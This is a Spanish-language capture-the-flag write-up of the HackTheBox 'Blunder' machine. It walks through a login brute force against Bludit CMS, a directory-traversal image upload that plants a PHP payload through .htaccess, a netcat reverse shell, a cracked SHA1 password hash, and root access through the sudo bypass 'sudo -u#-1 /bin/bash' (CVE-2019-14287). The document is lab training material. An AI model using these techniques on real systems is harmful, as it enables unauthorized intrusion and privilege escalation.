---
title: Blunder
published: 2025-08-09
image: "./logo.png"
tags: [Easy, Bludit CMS, Bypassing IP Blocking, Directory Traversal, Playing with .htaccess, Image File Upload, CVE-2019-14287, eWPT, OSWE, eWPTXv2]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Bludit CMS Exploitation
- Bypassing IP Blocking (X-Forwarded-For Header)
- Directory Traversal Image File Upload (Playing with .htaccess)
- Abusing sudo privilege (CVE-2019-14287)

### Preparación

- eWPT
- OSWE
- eWPTXv2

***

## Reconocimiento

### Nmap

#### Apache (80)

```
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-generator: Blunder
```

### Fuzzing

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FzibESK5M60iAKvmcWiwz%2Fimage.png?alt=media&#x26;token=46f40d98-e4f3-4d34-a4ab-283f4a7606b5" alt=""><figcaption></figcaption></figure>

Haciendo un poco de fuzzing encontramos varias rutas interesantes, como **todo.txt**:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fzb9bywleghI4vAqH8Pzn%2Fimage.png?alt=media&#x26;token=af3e33d5-7134-420a-8013-6b21e316fb0d" alt=""><figcaption></figcaption></figure>

Y la ruta `/admin`:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FoSS3t4nHnwQcW6oD2Ayd%2Fimage.png?alt=media&#x26;token=9f10f54a-a2ca-4328-b15a-c2bf311537f3" alt=""><figcaption></figcaption></figure>

Si intentamos hacer brute force, veremos el siguiente mensaje:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F0PBfTRicA8csTboIcxYH%2Fimage.png?alt=media&#x26;token=8736094f-d885-4027-abf4-8c6f3c700caf" alt=""><figcaption></figcaption></figure>

## Explotación

Buscando exploits para este caso encontramos uno:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FjqFdKmfX5MTAbUxer7Ua%2Fimage.png?alt=media&#x26;token=b7b02143-edb6-4d10-81c6-0f2f03b8fe63" alt=""><figcaption></figcaption></figure>

Lo descargamos y cambiamos el target y el wordlist, y probamos a hacer un ataque, pero con **rockyou.txt**, pero no encontramos nada. Probamos a hacer un diccionario propio con **cewl** basándonos en la propia web:

```
cewl -m 4 http://10.10.10.191 | sort -u > wordlist
```

Finalmente encontramos la contraseña para el usuario **fergus**:

```
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

### Searchsploit

Sabiendo esto podemos buscar algun exploit en **searchsploit**:

```
❯ searchsploit bludit
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                          | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                          | php/remote/47699.rb
Bludit 3-14-1 Plugin 'UploadPlugin' - Remote Code Execution (RCE) (Authenticated)                                                                    | php/webapps/51160.txt
Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                | php/webapps/50529.txt
Bludit 3.9.12 - Directory Traversal                                                                                                                  | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                         | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                   | multiple/webapps/48701.txt
Bludit 4.0.0-rc-2 - Account takeover                                                                                                                 | php/webapps/51360.txt
Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated)                                                                              | php/webapps/51541.py
Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated)                                                                               | php/webapps/51476.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                    | php/webapps/46060.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
❯ searchsploit -m multiple/webapps/48701.txt
  Exploit: Bludit 3.9.2 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/48701
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48701.txt
    Codes: CVE-2019-16113
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/zelpro/HTB/Blunder/exploits/48701.txt
```

Este exploit tiene instrucciones de uso:

```
#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png
```

### Shell www-data

Y ya tendremos una reverse shell con el usario **www-data**:

```
❯ nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.191] 36532
whoami
www-data
```

Buscando información sobre el usuario **hugo** de la máquina víctima, en la ruta `/var/www/bludit-3.10.0a`, podemos encontrar el `users.php`:

```
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Podemos ver que la contraseña es un **hash** de tipo **SHA1**, lo descifraremos con la web: [https://md5decrypt.net/en/Sha1/](https://md5decrypt.net/en/Sha1/#google_vignette):&#x20;

```
faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120
```

Y ya tendriamos la **user flag**:

```
hugo@blunder:~$ cat user.txt 
fd6b01457fe62583...
```

## Escalada de privilegios

Con el comando `sudo -l` podremos ver los comandos que puede ejecutar el usuario actual con permisos de superusuario:

```
hugo@blunder:~$ sudo -l
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Esto significa que el usuario hugo puede ejecutar `/bin/bash` como otros usuarios excepto como **root**. Vamos a buscar exploits relacionados:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FxUIcV9lokZW9zi5HCItD%2Fimage.png?alt=media&#x26;token=d47c7903-cfe5-4c3d-af2b-c845b557de4b" alt=""><figcaption></figcaption></figure>

### Abusing sudo privilege (CVE-2019-14287)

Este tiene una situación igual a la que tenemos, es para la versión 1.8.27, vamos a comprobar cuál tenemos:

```
hugo@blunder:~$ sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```

Tenemos una versión compatible con el exploit, en la información nos dice que con este comando `sudo -u#-1 /bin/bash` obtendremos root:

```
hugo@blunder:~$ sudo -u#-1 /bin/bash
Password: 
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo# cd /root/
root@blunder:/root# ls
log  reset.sh  root.txt  snap
root@blunder:/root# cat root.txt 
0b5c1bbffde405138...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/254)

---